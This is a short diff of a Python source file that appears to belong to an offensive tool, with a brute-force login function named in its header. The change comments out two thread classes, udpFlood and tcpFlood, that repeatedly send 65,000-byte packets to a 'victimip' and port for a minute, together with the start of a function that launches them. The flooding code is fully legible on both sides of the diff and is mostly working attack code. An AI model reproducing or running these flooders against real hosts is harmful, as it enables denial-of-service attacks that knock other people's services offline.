@@ -434,40 +434,40 @@ def custombruteforce(address, port, email, combination, minimum, maximum):
 		else:
 			break
 
-class udpFlood(threading.Thread):
-    def __init__ (self, victimip, victimport):
-        threading.Thread.__init__(self)
-        self.victimip = victimip
-	self.victimport = victimport
+#class udpFlood(threading.Thread):
+#    def __init__ (self, victimip, victimport):
+#        threading.Thread.__init__(self)
+#        self.victimip = victimip
+#	self.victimport = victimport
+#
+#    def run(self):
+#	timeout = time.time() + 60
+#        while True:
+# 		test = 0
+#    		if (time.time() <= timeout):
+#			s = socket(AF_INET, SOCK_DGRAM)
+#			s.connect((self.victimip, int(self.victimport)))
+#			s.send('A' * 65000)        
+#		else:
+#			break
 
-    def run(self):
-	timeout = time.time() + 60
-        while True:
- 		test = 0
-    		if (time.time() <= timeout):
-			s = socket(AF_INET, SOCK_DGRAM)
-			s.connect((self.victimip, int(self.victimport)))
-			s.send('A' * 65000)        
-		else:
-			break
-
-class tcpFlood(threading.Thread):
-    def __init__ (self, victimip, victimport):
-        threading.Thread.__init__(self)
-        self.victimip = victimip
-	self.victimport = victimport
-
-    def run(self):
-	timeout = time.time() + 60
-        while True:
- 		test = 0
-    		if (time.time() <= timeout):
-			s = socket(AF_INET, SOCK_STREAM)
-			s.settimeout(1)
-			s.connect((self.victimip, int(self.victimport)))
-			s.send('A' * 65000)       
-		else:
-			break
+#class tcpFlood(threading.Thread):
+#    def __init__ (self, victimip, victimport):
+#        threading.Thread.__init__(self)
+#        self.victimip = victimip
+#	self.victimport = victimport
+#
+#    def run(self):
+#	timeout = time.time() + 60
+#        while True:
+# 		test = 0
+#    		if (time.time() <= timeout):
+#			s = socket(AF_INET, SOCK_STREAM)
+#			s.settimeout(1)
+#			s.connect((self.victimip, int(self.victimport)))
+#			s.send('A' * 65000)       
+#		else:
+#			break
 
 def udpUnleach(victimip, victimport):
 	threads = []
